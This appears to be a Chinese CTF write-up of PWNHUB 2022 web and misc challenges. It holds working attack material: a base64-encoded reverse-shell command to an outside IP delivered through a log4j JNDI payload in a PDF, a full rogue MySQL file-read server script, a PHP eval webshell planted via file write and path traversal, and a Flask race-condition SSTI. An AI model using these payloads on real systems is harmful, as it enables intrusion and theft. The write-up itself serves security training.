0x01 Web
========

EzPDFParser
-----------

扔IDEA里

![image-20220426092718920](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9e6ed5d7701eabfb700930d0db25af15b3be1b8a.png)

可以确定是log4j

`https://github.com/eelyvy/log4jshell-pdf`，跟着复现

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMjE1LjI1LjE2OC8yMzMzIDA+JjE=}|{base64,-d}|bash" -A "114.215.25.168"`

![image-20220426093858670](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b73ddf99b45786e08094bf76515a058bf55a3d19.png)

先生成一个PDF，找到size这里

![image-20220426093128515](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d1a55a2efa973b4d3368f97e3fe0b33f59711c72.png)

```php
${jndi:ldap:${sys:file.separator}${sys:file.separator}114.215.25.168:1389${sys:file.separator}i5sswg}
```

![image-20220426094015052](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9122595d61f8325bc30fa0f5de28d4295415a25b.png)

上传后getshell

![image-20220426094126551](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-77141bb854b8859a59ee354e6d59b342076e3f0d.png)

easyCMS
-------

一个mysql文件读，起一个mysql服务，读取源码

```python
#!/usr/bin/env python
#coding: utf8

import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers

PORT = 2333

log = logging.getLogger(__name__)

log.setLevel(logging.INFO)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
    '/var/www/html/route/route.php',
)

#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Gifts'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)

class LastPacket(Exception):
    pass

class OutOfOrder(Exception):
    pass

class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)

class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',  # Protocol
                    '5.6.28-0ubuntu0.14.04.1' + '\0',
                    '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                ))            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()

class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)

z = mysql_listener()
# daemonize()
asyncore.loop()
```

testTool.php：

```php
<?php
// \xe5\x9c\xa8\xe7\x94\x9f\xe4\xba\xa7\xe7\x8e\xaf\xe5\xa2\x83\xe4\xb8\x8b\xe5\x88\xa0\xe9\x99\xa4\xe6\xad\xa4\xe5\xb7\xa5\xe5\x85\xb7\xe7\xb1\xbb\xef\xbc\x81
defined("INDEX") ? : header("Location: /");

class testTool extends baseTool
{
    public function __construct($arg)
    {
        $this->input["var"] = $arg['192.168.88.141'] or NULL;
    }

    public static function init()
    {
        parent::userToolInit(__CLASS__, './index.php?s=tool/test', 'test\xe7\xb1\xbb');
    }

    private function test()
    {
        @mkdir("/tmp/sandbox");
        if (is_string($this->input["var"])) {
            $value = unserialize($this->input["var"]);   
            $this->output = $value();
        } else if (is_array($this->input["var"])) {
            $value = $this->input["var"];
            $path = '/tmp/sandbox/'.md5($_SERVER['REMOTE_ADDR']); ///tmp/sandbox/c2dd020c05b439f7c0f7c44b3eaa5964
            if (!file_exists($path)) {
                mkdir($path, 0777, true);
            }
            @file_put_contents($path.'/'.basename($value['file']), $value['data']);
        } else {
            $this->output = NULL;
        }
    }

    public function __invoke()
    {
        call_user_func(array($this, 'test'));
        return $this->output;
    }
}
```

route.php

```php
<?php
defined("INDEX") ? : header("Location: /");

class route
{
    public $args = NULL;

    protected $sArray = NULL;
    protected $toolVar = NULL;

    protected $mode = NULL;
    protected $class = NULL;

    protected $viewPath = NULL;
    protected $toolPath = NULL;

    public function __construct($s)
    {
        $this->sArray = explode('/', $s, 2);

        $this->mode = $this->sArray[0];
        $this->class = $this->sArray[1];

        $this->args = $_POST or NULL;
    }

    public function loadAutoTool()
    {
        foreach(glob("./tools/autoLoadTools/*.php") as $file) {
            include_once($file);
        }

        return $this;
    }

    public function getTool()
    {
        include_once('./tools/baseTool.php');
        try {
            if($this->mode === 'index')
                $this->toolPath = 'webTools';
            elseif($this->mode === 'tool')
                $this->toolPath = 'userTools';
            else
                throw new Exception('Mode Error!');

            $toolPath = './tools/'.$this->toolPath.'/'.$this->class.'Tool.php';

            if(file_exists($toolPath) & include_once($toolPath));
            else
                throw new Exception('File Error!');

        } catch(Exception $e) {
            $this->includeError();
            return NULL;
        }

        return $this;
    }

    public function startTool()
    {
        $toolClass = $this->class.'Tool';
        if (class_exists($toolClass)) {
            $toolObj = new $toolClass($this->args);
            $this->toolVar = $toolObj();
        } else {
            $this->includeError();
            return NULL;
        }
        return $this;
    }

    public function getView()
    {
        $toolVar = $this->toolVar;
        switch (gettype($toolVar)) {
            case "array":
                $toolVar = htmlTool::arrayHtmlChar($toolVar);
                break;

            case "string":
                $toolVar = htmlTool::stringHtmlChar($toolVar);
                break;
        }

        try {
            if($this->mode === 'index')
                $this->viewPath = 'index';
            elseif($this->mode === 'tool')
                $this->viewPath = 'tool';
            else
                throw new Exception('Mode Error!');

            $viewPath = './view/'.$this->viewPath.'/'.$this->class.'.php';

            if(file_exists($viewPath))
                require_once($viewPath);
            else
                throw new Exception('File Error!');

        } catch(Exception $e) {
            $this->includeError();
            return NULL;
        }

        return $this;
    }

    public function includeError()
    {
        include_once('./view/error/404.php');
    }
}
```

利用点：可以写文件，要传序列化数据

![image-20220426190844799](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2e1a9bc5523418e0c3124341f28ca057c72e721c.png)

`sArray[1];` 是 `/` 之后的所有内容，可以目录穿越，包含getshell：

![image-20220426190938526](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6d59350dd6ab71f7a3264f0fb6207be2ef1437ae.png)

```php
http://47.97.127.1:21445/index.php?s=tool/test

Y0U_CA0_n3vEr_F1nD_m3_LOL=s:7:"phpinfo";
```

![image-20220426191818524](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0126ebf7da09f0251cc1c23c4eab084c14bcc449.png)

phpinfo查看REMOTE\_ADDR：

![image-20220426192917523](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9f8eb02a9a66a86f811c6e4945928849fe0dc026.png)

本机ip：123.233.253.147，md5：83003065800cb9011a96bde94e33ea82，所以文件在/tmp/sandbox/83003065800cb9011a96bde94e33ea82下

写入

```php
Y0U_CA0_n3vEr_F1nD_m3_LOL[file]=evilTool.php&Y0U_CA0_n3vEr_F1nD_m3_LOL[data]=<?php eval($_POST[mon]);?>
```

包含：

```php
http://47.97.127.1:21445/index.php?s=tool/../../../../../../../../../tmp/sandbox/83003065800cb9011a96bde94e33ea82/evil

mon=system('ls /');
```

![image-20220426193028614](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0957549dad572438c29255ea27c891d63078f4f3.png)

baby\_flask
-----------

```python
import time
import re,os,sys
from flask import Flask,render_template,request

nums,locked = 0, False
app = Flask(__name__)

@app.route('/')
@app.route('/index')
def domain():
    return 'Hello'

@app.route('/create')
def create():
    try:
        global nums, locked
        assert not locked, "LOCKED"
        default_content = "<h1>2</h1>"
        locked = True
        if nums > 9999:
            raise Exception("templates full")

        with open(f'./templates/{nums}.html', 'w') as f:
            f.write(default_content)

        msg = render_template(f'{nums}.html')
        if msg != default_content:
            kill()
        nums += 1
    except Exception as e:
        msg = f"Something fail. {e}"
    locked = False
    return msg

@app.route('/show/<int:tid>')
def show(tid):
    try:
        global locked
        assert not locked, "LOCKED"

        locked = True
        if not os.path.exists(f'./templates/{tid}.html'):
            raise Exception('file not found')

        msg = render_template(f'{tid}.html')
    except Exception as e:
        msg = f"Something fail. {e}"
    locked = False
    return msg

@app.route('/edit/<int:tid>', methods = ["POST"])
def edit(tid):
    try:
        global locked
        assert not locked, "LOCKED"
        locked = True

        if not os.path.exists(f'./templates/{tid}.html'):
            raise Exception('file not found')

        if not request.files.get('edit.html'):
            raise Exception('Please give me edit file')

        f = request.files['edit.html']
        f.save(f'./templates/{tid}.html')
        msg = 'ok'
    except Exception as e:
        msg = f"Something fail. {e}"
    locked = False
    return msg

@app.route('/kill')
def kill():
    func = request.environ.get('werkzeug.server.shutdown')
    func()
    return 'server exiting.'

if not os.path.exists('templates'):
    os.system('mkdir templates')
else:
    os.system('rm ./templates/*.html')

app.run(host='0.0.0.0', port=5001)
```

这里的 edit 路由一看就很有问题，在我们可以随意更改与读取模板的情况下肯定会存在 SSTI 问题的出现，但是

这里我们在本地测试后发现 edit 写入后并不会重新加载模板，我们在 show 的时候显示的还是 create 时写入的内容。

Flask 中有两个配置项 app.DEBUG 与 APP.jinja\_env.auto\_reload，前者为 Ture 时 代码更改后立即生效，后者为 Ture 时 模板修改后立即生效，无需重启，否则我们要重新加载的话是需要让 flask 应用重启的。

这里想到了之前 \*CTF 中的 lotto，我们覆盖 app.py 后也是需要让应用重启的，但是那里给出了 dockerfile，我们知道启动方式为 gunicorn，这里在测试后发现延时或者抓包不放包等并不能使服务重启。

不过这里的 kill 路由存在使应用退出的功能，但是访问也访问不到，查询一下发现

![img](2022%20PWNHUB%20%E6%98%A5%E5%AD%A3%E8%B5%9B%20WriteUp%20Web&Misc.assets/-16509709668251.assets)

那这个 kill 路由算是废掉了

重新审计源码，猜测存在并发时的线程安全问题，locked 全局变量可以在并发的其他路由中得到解除，同时可以在 `msg = render_template(f'{nums}.html')` 之前，利用 edit 实现模板的更改，成功加载。

create ，然后 edit，最后 show 查看

![image-20220426194044771](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ba802f24c6aa9d33d77b07807dafb437daa2c77b.png)

写入 SSTI，成功执行

![image-20220426194059698](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ed805ff53fa27e491d3f4f7360d1d1fdc929269f.png)

cat flag

![image-20220426194114306](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-161b7cedafcb50a23a2b91ef7dcec6b5596cf513.png)

成功拿到 flag

0x02 Misc
=========

眼神得好
----

stegsolve stereogram solver倒着放

![image-20220426083505307](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-92589860217823cc0af2f89e39064e32c3e9ff9e.png)

被偷的flag
-------

stegslove B0通道发现二维码

![image-20220426083745340](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-45f64633b03d990a75552391c6509a89b6fa014d.png)

扫码得到：1e:))}

![image-20220426083822414](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-96b04f08d2088ec125015bfe819c19992ad1b570.png)

binwalk得到

![image-20220426083933999](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ef2101b08f22efe510f3fb202a7db051cc5e228d.png)

archpr爆破得到密码是`flag{32145(`，得到一个txt和pyc

pyc隐写，Stegosaurus提取出VqtS-HZ&amp;\*，txt 0宽得到Unc，最后是

![image-20220426084132070](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b3a1bda78eaa236576e949b0afcd8e8318f10a8c.png)

然后`VqtS-HZ&*`是base85，得到

![image-20220426084250154](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c973960a11ccda4bcbe98ce1983e8ad5cfa54ea7.png)

现在是：`flag{32145(base64(Unc1e:))}`

32145 -&gt; 32 14 5 -&gt; md5

flag{md5(base64(Unc1e:))}

bad cat
-------

先是个cat变换，图太小，太难看了，爆破出来也看不出来....爆破变换参数

```python
import numpy as np
import matplotlib.pyplot
from skimage.io import imread, imshow
import time
import math
import cv2

def arnold_decode(image, shuffle_times, a, b):
    decode_image = np.zeros(shape=image.shape)
    h, w = image.shape[0], image.shape[1]
    N = h # 或N=w
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                new_x = ((a*b+1)*ori_x + (-b)* ori_y)% N
                new_y = ((-a)*ori_x + ori_y) % N
                decode_image[new_x, new_y] = image[ori_x, ori_y]
    cv2.imshow("image",decode_image)
    cv2.waitKey(10)
    cv2.imwrite(i,decode_image)
    return decode_image
final = imread('what.png')
n = 0
for m in range(0,1):
    for z in range(0,500):
        i = str(n) + '.png'
        print(i,z,m)
        arnold_decode(final, 10, z,m)
        n = n+1
```

爆破出横向变换参数是16，可以爆破单一参数

![image-20220426165135861](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-26dcca5f50e14643dec98136027b0d8aa5692fad.png)

手撕：

![image-20220426144917773](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8fd5b3efb33c2694ae06c6520aceb0cf6ad769c4.png)

强制扫描

![image-20220426144931143](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5e4f53e6e94343b99f4fbf33a9d2630698edbe9d.png)

xor一下

![image-20220426145009768](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-dfb573df0cf9474441c46d045914bdbc6a8effda.png)

看一下数据存储顺序：

![image-20220426145125024](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ad874ac55b22d56f095dde43d54e0b6805c63f73.png)

对比一下数据顺序：110101111101

![image-20220426145155268](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-44236fa440743d9ba67ba018f7f8d7d10b9a2315.png)

可以看到跟这个顺序是一样的：110101111101

![image-20220426145305687](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-23ce41baf48a23791777748223ee466e080d5992.png)

可以看到对起来，左边的数据，01000110的16进制转字符串，就是F，对应FLAG的F

![image-20220426145022390](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-24c477ea49ee35a393180a2d03ed14befbbfae51.png)

这里要写脚本，但是我懒，所以对着flag撕一下

现在这些空着的地方是需要补齐的，被我填上的是有数据的数据区：

![image-20220426152250680](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-4538c14f4019f8e31348b783cbc543f352ba4700.png)

![image-20220426152129816](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b10ac911649a36d0195197b814b2902c445b6229.png)

根据我们查的资料，数据后面要用这些补齐码字符补齐：

![image-20220426152318913](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e7bb8968c800bcd5d093c2f84aec0066f0d3cf51.png)

但是我按照这些手填上补齐码，也不对，不知道为啥

0x03 other
==========

签到
--

![image-20220426085418050](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-87cbe4eb08deb4c77f6f19cdbcc263ed4b48f87b.png)